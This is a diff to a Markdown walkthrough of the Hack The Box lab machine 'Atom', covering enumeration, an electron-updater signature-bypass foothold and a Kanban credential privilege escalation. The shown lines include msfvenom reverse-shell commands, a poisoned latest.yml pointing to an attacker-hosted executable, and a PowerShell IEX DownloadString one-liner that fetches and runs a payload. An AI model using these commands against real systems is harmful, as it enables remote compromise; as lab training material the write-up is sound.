@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.237 atom.htb
+**IP-ADDR:** 10.10.10.237 atom.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT     STATE SERVICE      VERSION
 80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
@@ -75,54 +75,64 @@ And if we reverse the executable with `7z` in linux and find the `resources` fol
 This application using vulnerable version of `electron-updater` package.
 
 * Vulnerability found from [snyk VulnerabilityDB](https://snyk.io/vuln/SNYK-JS-ELECTRONUPDATER-561421)
-* __electron-builder's Electron-Updater PoC blog from [blog.doyensec.com](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)__
+* **electron-builder's Electron-Updater PoC blog from [blog.doyensec.com](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)**
 
-# Foothold:Electron_Updater-RCE
+# Foothold
 
-__Exploit surface:__ The signature verification check performed by electron-builder is simply based on a string __comparison between the installed binary’s publisherName and the certificate’s Common Name attribute of the update binary__. During a software update, the application will request a file named __`latest.yml`__ from the __update server__, which contains the definition of the new release - including the binary filename and hashes.
+## Electron Updater RCE
+
+**Exploit surface:** The signature verification check performed by electron-builder is simply based on a string **comparison between the installed binary’s publisherName and the certificate’s Common Name attribute of the update binary**. During a software update, the application will request a file named **`latest.yml`** from the **update server**, which contains the definition of the new release - including the binary filename and hashes.
 
 * our application is using smb share's client folder for new `latest.yml` and we have access to these "client" folders.
 
-__Other part:__ an attacker could __bypass the entire signature verification__ by triggering a parse error in the script. This can be easily achieved by __using a filename containing a single quote (`'`) and then by recalculating the file hash to match the attacker-provided binary__ (using `shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64`).
+**Other part:** an attacker could **bypass the entire signature verification** by triggering a parse error in the script. This can be easily achieved by **using a filename containing a single quote (`'`) and then by recalculating the file hash to match the attacker-provided binary** (using `shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64`).
 
 * Found update process form  [electron docs](https://www.electron.build/auto-update#staged-rollouts)
 
-## Exploit:auto_updater
+**Exploit**
 
-__Generate reverse shell with msfvenom__
+**Generate reverse shell with msfvenom**
 ```bash
 ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f exe -o "rev'Shell.exe"
 ```
 
-__generate sha512 bash encoded hash__
+**generate sha512 bash encoded hash**
 ```bash
 ❯ sha512sum rev\'Shell.exe | cut -d " " -f1 | xxd -r -p | base64 -w 0
 77b46759lH58s81l3tMaetP541XEe+XJ2V+IEPOC5dF27MjxROsm/JJMVR7tt2CN/hmVikE5d8Wa9VuxMAnFNw==
 ```
 
-__latest.yml__
+**configure latest.yml**
 ```yml
 version: 1.0.1
 path: http://10.10.15.71/rev'Shell.exe
 sha512: 77b46759lH58s81l3tMaetP541XEe+XJ2V+IEPOC5dF27MjxROsm/JJMVR7tt2CN/hmVikE5d8Wa9VuxMAnFNw==
 ```
 
-__upload `latest.yml` in the smb share's "client" folder.__
+**upload `latest.yml` in the smb share's "client" folder.**
 
 ![](screenshots/rev-shell.png)
 
 
-__Getting msf shell with msfvenom paylaod__
+<details>
+<summary><strong>msf shell</strong></summary>
+
+Generate Reverse shell with msfvenom
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f psh -o msf_shell.ps1
 ```
 
-Execute
+Execute with powershell IEX
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.71/msf_shell.ps1')
 ```
 
-# Privesc:Kanban_decrypt
+</details>
+</br>
+
+# Privesc
+
+## Kanban credentials encryption flaw
 
 * Only one user on the box "jason"
 
@@ -187,6 +197,3 @@ We can get the Administrator shell with `evil-winrm`
 
 ![](screenshots/atom-rooted.png)
 
-# PrintNightmare
-
-- [ ] TODO
